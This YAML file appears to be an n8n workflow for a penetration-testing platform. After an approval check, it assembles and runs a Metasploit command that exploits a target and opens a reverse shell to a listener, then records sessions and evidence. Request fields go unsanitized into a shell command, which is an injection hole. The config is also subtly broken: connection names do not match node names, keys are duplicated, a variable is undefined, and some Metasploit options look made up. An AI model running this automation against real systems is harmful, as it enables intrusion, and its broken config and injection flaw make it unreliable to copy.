id: 9
name: Exploitation Execution Workflow
active: true
settings:
  executionOrder: v1
  saveManualExecutions: true
nodes:
  - id: webhook
    name: Webhook Trigger
    type: n8n-nodes-base.webhook
    typeVersion: 1
    position:
      - 250
      - 300
    parameters:
      path: anptop/exploitation-execute
      httpMethod: post
      options: {}
  - id: validate-approval
    name: Validate Approval
    type: n8n-nodes-base.httpRequest
    typeVersion: 1
    position:
      - 450
      - 300
    parameters:
      method: get
      url: >-
        http://backend:8000/api/v1/approvals/{{ $json.approval_id }}/validate
      sendHeaders: true
      headerParameters:
        parameters:
          - name: Authorization
            value: Bearer {{ $env.API_TOKEN }}
      options: {}
  - id: check-valid
    name: Check Valid
    type: n8n-nodes-base.if
    typeVersion: 1
    position:
      - 650
      - 300
    parameters:
      conditions:
        boolean:
          - value1: "{{ $json.valid }}"
            operation: equal
  - id: log-start
    name: Log Execution Start
    type: n8n-nodes-base.httpRequest
    typeVersion: 1
    position:
      - 850
      - 200
    parameters:
      method: post
      url: >-
        http://backend:8000/api/v1/exploits
      sendHeaders: true
      headerParameters:
        parameters:
          - name: Authorization
            value: Bearer {{ $env.API_TOKEN }}
      sendBody: true
      bodyParameters:
        parameters:
          - name: json
            value: >-
              {"engagement_id": {{ $json.engagement_id }}, "vulnerability_id": {{ $json.vulnerability_id }}, "status": "executing", "executed_by": {{ $json.requested_by }}, "started_at": "{{ $node['Webhook Trigger'].json.timestamp }}"}
      options: {}
  - id: prepare-context
    name: Prepare Context
    type: n8n-nodes-base.function
    typeVersion: 1
    position:
      - 1050
      - 200
    parameters:
      functionCode: |
        const request = items[0].json;
        
        // Build context file for exploitation
        const context = {
          engagement_id: request.engagement_id,
          target_ip: request.target_ip,
          target_port: request.target_port || 80,
          vulnerability_id: request.vulnerability_id,
          exploit_module: request.exploit_module || 'auto',
          listener_ip: process.env.LISTENER_IP || '10.0.0.1',
          listener_port: process.env.LISTENER_PORT || 4444,
          timestamp: new Date().toISOString(),
          constraints: {
            timeout: request.timeout || 300,
            retries: request.retries || 1,
            payload: request.payload || 'generic/shell_reverse_tcp'
          }
        };
        
        // Write context file
        const fs = require('fs');
        const contextPath = `/tmp/anptop/context_${request.engagement_id}_${request.vulnerability_id}.json`;
        fs.writeFileSync(contextPath, JSON.stringify(context, null, 2));
        
        return [{
          json: {
            ...request,
            context_file: contextPath,
            msfconsole_command: buildMsfConsoleCommand(context)
          }
        }];
        
        function buildMsfConsoleCommand(context) {
          return `msfconsole -q -x '
            use exploit/${context.exploit_module};
            set RHOST ${context.target_ip};
            set RPORT ${context.target_port};
            set PAYLOAD ${context.constraints.payload};
            set LHOST ${context.listener_ip};
            set LPORT ${context.listener_port};
            set TargetTimeout ${context.constraints.timeout};
            set EnableContextEncoding true;
            set ContextInformationFile ${context.context_file};
            exploit;
            exit;
          '`;
        }
  - id: execute-exploit
    name: Execute Metasploit
    type: n8n-nodes-base.executeCommand
    typeVersion: 1
    position:
      - 1250
      - 200
    parameters:
      command: "{{ $json.msfconsole_command }}"
      options:
        shell: true
        workingDirectory: /tmp/anptop/exploits
        timeout: "{{ $json.timeout || 300 }}"
  - id: parse-output
    name: Parse Exploit Output
    type: n8n-nodes-base.function
    typeVersion: 1
    position:
      - 1450
      - 200
    parameters:
      functionCode: |
        const output = items[0].json.stdout || '';
        const stderr = items[0].json.stderr || '';
        
        // Parse session information
        const sessionMatch = output.match(/meterpreter session (\d+) opened/i);
        const shellMatch = output.match(/shell (\d+) obtained/i);
        const errorMatch = output.match(/exploit failed: (.+)/i);
        const sessionMatch2 = output.match(/Command shell session (\d+) opened/i);
        
        let result = {
          success: false,
          session_id: null,
          session_type: null,
          error_message: null,
          output: output.substring(0, 5000),
          error: stderr.substring(0, 1000),
          completed_at: new Date().toISOString()
        };
        
        if (sessionMatch) {
          result.success = true;
          result.session_id = sessionMatch[1];
          result.session_type = 'meterpreter';
        } else if (shellMatch) {
          result.success = true;
          result.session_id = shellMatch[1];
          result.session_type = 'shell';
        } else if (sessionMatch2) {
          result.success = true;
          result.session_id = sessionMatch2[1];
          result.session_type = 'command_shell';
        } else if (errorMatch) {
          result.error_message = errorMatch[1];
        }
        
        // Additional parsing for reverse shells
        if (output.includes('Sending stage') && output.includes('to')) {
          result.success = true;
          result.session_type = result.session_type || 'reverse_shell';
        }
        
        return [{
          json: result
        }];
  - id: update-record
    name: Update Exploit Record
    type: n8n-nodes-base.httpRequest
    typeVersion: 1
    position:
      - 1650
      - 200
    parameters:
      method: put
      url: >-
        http://backend:8000/api/v1/exploits/{{ $json.exploit_id }}
      sendHeaders: true
      headerParameters:
        parameters:
          - name: Authorization
            value: Bearer {{ $env.API_TOKEN }}
      sendBody: true
      bodyParameters:
        parameters:
          - name: json
            value: >-
              {"status": "{{ $json.success ? 'completed' : 'failed' }}", "success": {{ $json.success }}, "session_id": "{{ $json.session_id }}", "session_type": "{{ $json.session_type }}", "completed_at": "{{ $json.completed_at }}", "output": "{{ $json.output | replace('\"', '\\\"') }}", "error_message": "{{ $json.error_message || '' }}"}
      options: {}
  - id: collect-evidence
    name: Collect Evidence
    type: n8n-nodes-base.httpRequest
    typeVersion: 1
    position:
      - 1850
      - 200
    parameters:
      method: post
      url: >-
        http://backend:8000/api/v1/webhooks/evidence-collection
      sendHeaders: true
      headerParameters:
        parameters:
          - name: Authorization
            value: Bearer {{ $env.API_TOKEN }}
      sendBody: true
      bodyParameters:
        parameters:
          - name: json
            value: >-
              {"engagement_id": {{ $json.engagement_id }}, "exploit_id": {{ $json.exploit_id }}, "host_id": {{ $json.target_host_id }}, "evidence_types": ["screenshot", "command_output", "session_info"], "triggered_by": "exploitation"}
      options: {}
    parameters:
      condition: "{{ $json.success }}"
  - id: notify-success
    name: Notify Success
    type: n8n-nodes-base.httpRequest
    typeVersion: 1
    position:
      - 2050
      - 100
    parameters:
      method: post
      url: >-
        http://backend:8000/api/v1/notifications
      sendHeaders: true
      headerParameters:
        parameters:
          - name: Authorization
            value: Bearer {{ $env.API_TOKEN }}
      sendBody: true
      bodyParameters:
        parameters:
          - name: json
            value: >-
              {"type": "exploitation_success", "priority": "high", "message": "Exploitation successful! Session {{ $json.session_id }} opened on {{ $json.target_ip }}", "engagement_id": {{ $json.engagement_id }}, "session_id": "{{ $json.session_id }}"}
      options: {}
    parameters:
      condition: "{{ $json.success }}"
  - id: notify-failure
    name: Notify Failure
    type: n8n-nodes-base.httpRequest
    typeVersion: 1
    position:
      - 2050
      - 500
    parameters:
      method: post
      url: >-
        http://backend:8000/api/v1/notifications
      sendHeaders: true
      headerParameters:
        parameters:
          - name: Authorization
            value: Bearer {{ $env.API_TOKEN }}
      sendBody: true
      bodyParameters:
        parameters:
          - name: json
            value: >-
              {"type": "exploitation_failed", "priority": "medium", "message": "Exploitation failed: {{ $json.error_message || 'Unknown error' }}", "engagement_id": {{ $json.engagement_id }}, "vulnerability_id": {{ $json.vulnerability_id }}}
      options: {}
    parameters:
      condition: "{{ !$json.success }}"
  - id: webhook-response
    name: Webhook Response
    type: n8n-nodes-base.webhook
    typeVersion: 1
    position:
      - 2250
      - 300
    parameters:
      respondWith: json
      jsonResponse: >-
        {"status": "{{ $json.success ? 'success' : 'failed' }}", "session_id": "{{ $json.session_id }}", "execution_id": {{ $execution.id }} }
      options: {}
connections:
  Webhook Trigger:
    main:
      - - node: Validate Approval
          type: main
          index: 0
  Validate Approval:
    main:
      - - node: Check Valid
          type: main
          index: 0
  Check Valid:
    main:
      - - node: Log Start
          type: main
          index: 0
  Log Start:
    main:
      - - node: Prepare Context
          type: main
          index: 0
  Prepare Context:
    main:
      - - node: Execute Exploit
          type: main
          index: 0
  Execute Exploit:
    main:
      - - node: Parse Exploit Output
          type: main
          index: 0
  Parse Exploit Output:
    main:
      - - node: Update Exploit Record
          type: main
          index: 0
  Update Exploit Record:
    main:
      - - node: Collect Evidence
          type: main
          index: 0
      - - node: Notify Success
          type: main
          index: 0
      - - node: Notify Failure
          type: main
          index: 0
  Collect Evidence:
    main:
      - - node: Notify Success
          type: main
          index: 0
  Notify Success:
    main:
      - - node: Webhook Response
          type: main
          index: 0
  Notify Failure:
    main:
      - - node: Webhook Response
          type: main
          index: 0
